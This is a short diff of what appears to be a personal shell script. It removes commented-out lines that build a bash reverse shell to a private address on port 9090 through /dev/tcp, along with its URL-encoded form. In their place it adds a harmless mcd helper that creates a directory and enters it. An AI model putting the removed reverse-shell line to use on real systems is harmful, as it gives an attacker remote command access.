@@ -98,9 +98,7 @@ urlencode() {
     done
 }
 
-#clear_url="bash -c 'bash -i >& /dev/tcp/192.168.49.61/9090 0>&1'"
-
-#encoded_url=$(urlencode "${clear_url}")
-
-#echo ${encoded_url}
-#bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.61%2F9090%200%3E%261%27
+# Creates directory with full path and moves into it
+mcd() {
+  mkdir -pv $1 && cd $1
+}
